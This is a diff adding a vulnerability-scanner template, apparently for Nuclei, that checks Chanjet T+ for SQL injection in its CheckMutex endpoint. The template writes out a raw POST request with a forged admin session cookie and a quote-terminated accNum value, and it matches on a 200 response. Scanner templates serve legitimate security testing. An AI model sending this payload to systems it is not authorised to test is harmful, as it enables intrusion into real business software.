@@ -1,0 +1,26 @@
+id: poc-yaml-chanjet_t_plus-checkmutex-sqli
+
+info:
+  name: poc-yaml-chanjet_t_plus-checkmutex-sqli
+  author: chaitin
+  severity: medium
+  tags: xray-converted,sqli
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=110
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: ASP.NET_SessionId=; sid=admin
+        Content-Type: text/plain
+
+        {"accNum": "{{rand_int(1000, 9999)}}'", "functionTag": "SYS0104", "url": ""}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
